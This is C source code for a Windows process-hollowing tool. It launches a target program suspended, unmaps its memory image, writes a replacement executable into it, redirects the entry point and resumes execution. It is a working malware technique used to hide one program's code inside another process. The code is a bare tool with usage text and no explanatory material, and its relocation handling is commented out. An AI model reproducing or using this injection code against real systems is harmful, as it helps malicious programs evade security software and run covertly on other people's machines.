#include <stdio.h>
#include <windows.h>
#include <winternl.h>

#pragma comment(lib,"ntdll.lib")

EXTERN_C NTSTATUS NTAPI NtUnmapViewOfSection(HANDLE, PVOID);

typedef struct
{
	WORD	offset : 12;
	WORD	type : 4;
} IMAGE_RELOC, * PIMAGE_RELOC;

BOOL HollowingProces(char* targetExe, char* replaceExe){
    PIMAGE_DOS_HEADER pDosH = NULL;
	PIMAGE_NT_HEADERS pNtH = NULL;
	PIMAGE_SECTION_HEADER pSecH = NULL;
	HANDLE hFile = NULL;
	STARTUPINFOA si = {0};
	PROCESS_INFORMATION pi = {0};


	printf("[+] Create SUSPENDED Process.\n");
	if (!CreateProcessA(NULL, targetExe, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
	{
		printf("[-] Error Create Suspended process, error code: %d \r\n", GetLastError());
		return FALSE;
	}

	printf("[+] Reading the replacement executable.\n");
	hFile = CreateFileA(replaceExe, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{   
		printf("[-] Error Read file, error code: %d \r\n", GetLastError());
		return FALSE;
	}
	DWORD dwFileSize = GetFileSize(hFile, NULL);
	LPVOID lpImageBase = VirtualAlloc(NULL, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    ReadFile(hFile, lpImageBase, dwFileSize, NULL, NULL);
	CloseHandle(hFile);

	pDosH = (PIMAGE_DOS_HEADER)lpImageBase;
	pNtH = (PIMAGE_NT_HEADERS)((LPBYTE)lpImageBase + pDosH->e_lfanew);

	CONTEXT context ={0};
    context.ContextFlags = CONTEXT_FULL;
	GetThreadContext(pi.hThread, &context);

	LPVOID lpTargetImageBaseAddress = NULL;

#if defined(_M_X64) // _M_AMD64
	ReadProcessMemory(pi.hProcess, (PVOID)(context.Rdx + (sizeof(PVOID) * 2)), &lpTargetImageBaseAddress, sizeof(PVOID), NULL);
#else
	ReadProcessMemory(pi.hProcess, (PVOID)(context.Ebx + (sizeof(PVOID) * 2)), &lpTargetImageBaseAddress, sizeof(PVOID), NULL);
#endif

    printf("[+] Target process image base address: %p \r\n", lpTargetImageBaseAddress);

	NtUnmapViewOfSection(pi.hProcess, lpTargetImageBaseAddress);
	printf("[+] Unmap target image section. \r\n");

	LPVOID lpNewTargetImageBaseAddress = VirtualAllocEx(pi.hProcess, lpTargetImageBaseAddress, pNtH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!lpNewTargetImageBaseAddress){
        lpNewTargetImageBaseAddress = VirtualAllocEx(pi.hProcess, NULL, pNtH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }

	if (!lpNewTargetImageBaseAddress)
	{
		printf("[-] Error Alloc memroy in target process, error code: %d \r\n", GetLastError());
		return FALSE;
	}
	printf("[+] Alloc memory in target process, address: %p \r\n", lpNewTargetImageBaseAddress);

	// Copy header and section into target process
	WriteProcessMemory(pi.hProcess, lpNewTargetImageBaseAddress, lpImageBase, pNtH->OptionalHeader.SizeOfHeaders, NULL);
	for (SIZE_T i = 0; i <pNtH->FileHeader.NumberOfSections; i++)
	{
		pSecH = (PIMAGE_SECTION_HEADER)((LPBYTE)lpImageBase + pDosH->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
		WriteProcessMemory(pi.hProcess, (PVOID)((LPBYTE)lpNewTargetImageBaseAddress + pSecH->VirtualAddress), (PVOID)((LPBYTE)lpImageBase + pSecH->PointerToRawData), pSecH->SizeOfRawData, NULL);
	}

    // // Fix reloc
	// LPVOID lpModule = lpNewTargetImageBaseAddress;
	// UINT_PTR deltaBase = (UINT_PTR)lpModule - pNtH->OptionalHeader.ImageBase;
	// PIMAGE_DATA_DIRECTORY pDataDirecotry = (PIMAGE_DATA_DIRECTORY)(&pNtH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]);
    // PIMAGE_BASE_RELOCATION pRelocTable = NULL;
    // SIZE_T nRelocBlockNum = 0;
    // PIMAGE_RELOC pRelocBlock = NULL;
    // UINT_PTR relocValue;
	// if (pDataDirecotry->Size > 0)
	// {
    //     for (SIZE_T i = 0; i <pNtH->FileHeader.NumberOfSections; i++)
	//     {
	//     	pSecH = (PIMAGE_SECTION_HEADER)((LPBYTE)lpImageBase + pDosH->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
    //         if (pDataDirecotry->VirtualAddress >= pSecH->VirtualAddress && pDataDirecotry->VirtualAddress <= (pSecH->VirtualAddress + pSecH->Misc.VirtualSize)){
    //             pRelocTable = (PIMAGE_BASE_RELOCATION)(pDataDirecotry->VirtualAddress - pSecH->VirtualAddress + pSecH->PointerToRawData + (UINT_PTR)lpImageBase);
    //             break;
    //         }
	//     }
        
	// 	while (pRelocTable->SizeOfBlock)
	// 	{
	// 		nRelocBlockNum = (pRelocTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOC);
	// 		pRelocBlock = (PIMAGE_RELOC)((UINT_PTR)pRelocTable + sizeof(IMAGE_BASE_RELOCATION));
	// 		for (size_t i = 0; i < nRelocBlockNum; i++)
	// 		{
	// 			PUINT_PTR pRelocAddr = (PUINT_PTR)((UINT_PTR)lpModule + pRelocTable->VirtualAddress + pRelocBlock[i].offset);
	// 			if (pRelocBlock[i].type == IMAGE_REL_BASED_HIGHLOW || pRelocBlock[i].type == IMAGE_REL_BASED_DIR64)
	// 			{
	// 				// *pRelocAddr += deltaBase;
    //                 ReadProcessMemory(pi.hProcess, (LPVOID)pRelocAddr, &relocValue, sizeof(relocValue), NULL);
    //                 relocValue += deltaBase;
    //                 WriteProcessMemory(pi.hProcess, (LPVOID)pRelocAddr, &relocValue, sizeof(relocValue), NULL);
	// 			}
	// 			else if (pRelocBlock[i].type == IMAGE_REL_BASED_HIGH || pRelocBlock[i].type == IMAGE_REL_BASED_LOW)
	// 			{
	// 				//*pRelocAddr += HIWORD(deltaBase);
    //                 ReadProcessMemory(pi.hProcess, (LPVOID)pRelocAddr, &relocValue, sizeof(relocValue), NULL);
    //                 relocValue += HIWORD(deltaBase);
    //                 WriteProcessMemory(pi.hProcess, (LPVOID)pRelocAddr, &relocValue, sizeof(relocValue), NULL);
	// 			}
	// 		}
	// 		// Next
	// 		pRelocTable = (PIMAGE_BASE_RELOCATION)((UINT_PTR)pRelocTable + pRelocTable->SizeOfBlock);
	// 	}
	// }

#if defined(_M_X64) // _M_AMD64
	context.Rcx = (SIZE_T)((LPBYTE)lpNewTargetImageBaseAddress + pNtH->OptionalHeader.AddressOfEntryPoint);
	printf("[+] RCX => Entry point: %#zx\n", context.Rcx);
	WriteProcessMemory(pi.hProcess, (PVOID)(context.Rdx + (sizeof(SIZE_T) * 2)), &lpNewTargetImageBaseAddress, sizeof(PVOID), NULL);
	printf("[+] Update [Rdx + 16] => Peb->ImangeBase : %p \r\n", lpNewTargetImageBaseAddress);
#else
	context.Eax = (SIZE_T)((LPBYTE)lpNewTargetImageBaseAddress + pNtH->OptionalHeader.AddressOfEntryPoint);
	printf("[+] EAX => Entry point: %#zx\n", context.Eax);
	WriteProcessMemory(pi.hProcess, (PVOID)(context.Ebx + (sizeof(PVOID) * 2)), &lpNewTargetImageBaseAddress, sizeof(PVOID), NULL);
	printf("[+] Update [Ebx + 8] => Peb->ImangeBase : %p \r\n", lpNewTargetImageBaseAddress);
#endif
	
	SetThreadContext(pi.hThread, &context);
	printf("[+] Set thread context.\n");
    
	ResumeThread(pi.hThread);
	printf("[+] Thread resumed. \r\n");

    // Clean up
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
	VirtualFree(lpImageBase, 0, MEM_RELEASE);

    return TRUE;
}

int main(int argc, char* argv[])
{
	if (argc != 3)
	{
		printf("Usage: [Target executable] [Replacement executable]\n");
		return 1;
	}

    BOOL bRet = HollowingProces(argv[1], argv[2]);
    if (bRet){
        printf("[+] HollowingProces success \r\n");
    }else{
        printf("[+] HollowingProces failed \r\n");
    }
	
	return 0;
}